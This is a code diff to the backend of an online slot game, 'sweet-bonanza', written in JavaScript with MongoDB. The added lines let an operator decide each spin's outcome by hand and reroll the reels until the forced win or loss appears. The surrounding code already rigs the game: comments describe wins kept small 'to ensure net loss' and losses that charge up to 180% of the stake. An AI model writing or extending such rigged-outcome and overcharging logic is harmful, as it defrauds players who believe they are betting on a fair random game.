@@ -6,6 +6,7 @@
 const User = require('../models/User.model');
 const Transaction = require('../models/Transaction.model');
 const BalanceHistory = require('../models/BalanceHistory.model');
+const GameControl = require('../models/GameControl.model');
 const mongoose = require('mongoose');
 const asyncHandler = require('../middleware/error.middleware').asyncHandler;
 const AppError = require('../middleware/error.middleware').AppError;
@@ -36,7 +37,7 @@ const SYMBOL_MULTIPLIERS = {
 const getWeightedSymbol = () => {
   const totalWeight = Object.values(SYMBOL_WEIGHTS).reduce((sum, weight) => sum + weight, 0);
   let random = Math.random() * totalWeight;
-  
+
   for (const [symbol, weight] of Object.entries(SYMBOL_WEIGHTS)) {
     random -= weight;
     if (random <= 0) {
@@ -52,7 +53,7 @@ const getWeightedSymbol = () => {
  * Wins are small to ensure net loss over time
  */
 const generateReelResult = (betAmount) => {
-  const reels = Array(6).fill(null).map(() => 
+  const reels = Array(6).fill(null).map(() =>
     Array(3).fill(null).map(() => getWeightedSymbol())
   );
 
@@ -113,7 +114,7 @@ const generateReelResult = (betAmount) => {
     // Reduced scatter multipliers - wins smaller than losses
     const scatterMultiplier = scatterCount === 5 ? 1.5 : scatterCount >= 6 ? 2.5 : 0;
     totalWin += betAmount * scatterMultiplier;
-    
+
     // Add scatter positions as winning positions for visual feedback
     reels.forEach((reel, reelIndex) => {
       reel.forEach((symbol, symbolIndex) => {
@@ -170,7 +171,7 @@ exports.playGame = asyncHandler(async (req, res) => {
   }
 
   const bet = parseFloat(betAmount);
-  
+
   // Validate bet is a valid number
   if (isNaN(bet) || !isFinite(bet)) {
     throw new AppError('Invalid bet amount format', 400);
@@ -191,7 +192,7 @@ exports.playGame = asyncHandler(async (req, res) => {
   }
 
   const session = await mongoose.startSession();
-  
+
   try {
     session.startTransaction();
     // Get user with balance
@@ -218,14 +219,61 @@ exports.playGame = asyncHandler(async (req, res) => {
 
     const initialBalance = parseFloat(user.balance) || 0; // Main balance from deposits
 
+    // Admin Control Logic
+    const gameControl = await GameControl.create({
+      user: userId,
+      username: user.username,
+      betAmount: bet,
+      gameType: 'sweet-bonanza'
+    });
+
+    // Wait for decision or timeout (20 seconds for better UX)
+    const startTime = Date.now();
+    let decision = null;
+    while (Date.now() - startTime < 20000) {
+      const check = await GameControl.findById(gameControl._id);
+      if (check && check.status === 'completed') {
+        decision = check.result;
+        break;
+      }
+      // Small delay between checks
+      await new Promise(resolve => setTimeout(resolve, 1500));
+    }
+
+    if (!decision) {
+      // Timeout or no result - use default RNG but mark as timeout
+      await GameControl.findByIdAndUpdate(gameControl._id, { status: 'timeout' });
+    }
+
     // Generate game result first to determine if win or loss
-    const gameResult = generateReelResult(bet);
+    let gameResult;
+    if (decision === 'win') {
+      // Force win: loop until winAmount > 0
+      let attempts = 0;
+      do {
+        gameResult = generateReelResult(bet);
+        attempts++;
+        if (attempts > 50) break; // Safety break
+      } while (gameResult.winAmount <= 0);
+    } else if (decision === 'loss') {
+      // Force loss: loop until winAmount === 0
+      let attempts = 0;
+      do {
+        gameResult = generateReelResult(bet);
+        attempts++;
+        if (attempts > 50) break; // Safety break
+      } while (gameResult.winAmount > 0);
+    } else {
+      // Default RNG
+      gameResult = generateReelResult(bet);
+    }
+
     const { reels, winAmount, winningPositions } = gameResult;
 
     // Ensure winAmount is a valid number
     const actualWin = Math.max(0, parseFloat(winAmount) || 0);
     let actualLoss = bet;
-    
+
     // If no win, apply loss multiplier (losses are higher than wins)
     // Target: 63% loss rate with losses being higher than win amounts
     if (actualWin === 0) {
@@ -233,7 +281,7 @@ exports.playGame = asyncHandler(async (req, res) => {
       // Ensures losses are consistently higher than typical wins (which are 0.4x to 1.5x bet)
       const random = Math.random();
       let lossMultiplier;
-      
+
       if (random < 0.25) {
         // 25% chance: 100-115% of bet (small loss, still higher than most wins)
         lossMultiplier = 1.0 + (Math.random() * 0.15);
@@ -247,14 +295,14 @@ exports.playGame = asyncHandler(async (req, res) => {
         // 15% chance: 160-180% of bet (huge loss)
         lossMultiplier = 1.6 + (Math.random() * 0.20);
       }
-      
+
       actualLoss = bet * lossMultiplier;
-      
+
       // Ensure loss doesn't exceed user balance
       if (actualLoss > userBalance) {
         actualLoss = userBalance;
       }
-      
+
       // Ensure loss is not negative or zero
       actualLoss = Math.max(0, actualLoss);
     } else {
@@ -287,10 +335,10 @@ exports.playGame = asyncHandler(async (req, res) => {
       user.totalWinnings = (parseFloat(user.totalWinnings) || 0) + actualWin;
       await user.save({ session });
     }
-    
+
     // Final balance after all operations - this is the updated main balance
     const finalBalance = parseFloat(user.balance) || 0;
-    
+
     // Validate final balance is valid
     if (isNaN(finalBalance) || finalBalance < 0) {
       await session.abortTransaction();
@@ -320,15 +368,15 @@ exports.playGame = asyncHandler(async (req, res) => {
         winningPositions: winningPositions
       }
     };
-    
+
     const transaction = await Transaction.create([transactionData], { session });
-    
+
     // Validate transaction was created
     if (!transaction || !transaction[0] || !transaction[0]._id) {
       await session.abortTransaction();
       throw new AppError('Failed to create transaction record', 500);
     }
-    
+
     // Record balance history
     const balanceHistoryData = {
       user: userId,
@@ -357,7 +405,7 @@ exports.playGame = asyncHandler(async (req, res) => {
         winningPositions: winningPositions
       }
     };
-    
+
     await BalanceHistory.create([balanceHistoryData], { session });
 
     // Commit transaction
@@ -384,21 +432,21 @@ exports.playGame = asyncHandler(async (req, res) => {
     if (session.inTransaction()) {
       await session.abortTransaction();
     }
-    
+
     // Log error for debugging
     console.error('Sweet Bonanza playGame error:', error);
-    
+
     // If it's already an AppError, re-throw it
     if (error instanceof AppError) {
       throw error;
     }
-    
+
     // Handle Mongoose validation errors
     if (error.name === 'ValidationError') {
       const errors = Object.values(error.errors).map(e => e.message).join(', ');
       throw new AppError(`Validation error: ${errors}`, 400);
     }
-    
+
     // Handle other errors
     throw new AppError(error.message || 'An error occurred while playing the game', 500);
   } finally {
@@ -468,26 +516,26 @@ exports.getStats = asyncHandler(async (req, res) => {
   const totalGames = allHistory.length;
   const wins = allHistory.filter(h => h.changeType === 'win').length;
   const losses = allHistory.filter(h => h.changeType === 'loss').length;
-  
+
   const totalWinAmount = allHistory
     .filter(h => h.changeType === 'win')
     .reduce((sum, h) => {
       const winAmount = parseFloat(h.metadata?.winAmount) || 0;
       return sum + (isNaN(winAmount) ? 0 : winAmount);
     }, 0);
-    
+
   const totalBetAmount = allHistory.reduce((sum, h) => {
     const betAmount = parseFloat(h.metadata?.betAmount) || 0;
     return sum + (isNaN(betAmount) ? 0 : betAmount);
   }, 0);
-  
+
   const netProfit = totalWinAmount - totalBetAmount;
   const winRate = totalGames > 0 ? (wins / totalGames) * 100 : 0;
 
   res.json({
     success: true,
     data: {
-      
+
       totalGames,
       wins,
       losses,
